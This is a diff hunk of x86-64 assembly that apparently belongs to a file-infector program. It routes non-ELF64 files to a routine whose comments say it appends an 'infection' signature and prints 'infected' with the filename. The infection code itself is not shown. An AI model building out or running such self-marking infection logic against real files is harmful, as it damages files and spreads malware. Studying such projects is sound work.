@@ -106,13 +106,12 @@ check_elf64_exec:
     syscall
 
 .invalid_file:
-    ; Print filename
+    ; For non-ELF64 executables, process the file:
+    ; - Check if it contains the signature
+    ; - If yes: print "already infected"
+    ; - If no: append signature and print "infected " + filename
     mov rdi, r15
-    call print_string
-
-    ; Print " is not a valid elf64 executable\n"
-    lea rdi, [rel msg_invalid]
-    call print_string
+    call process_non_elf_file
 
 .next_file:
     inc r14                     ; index++
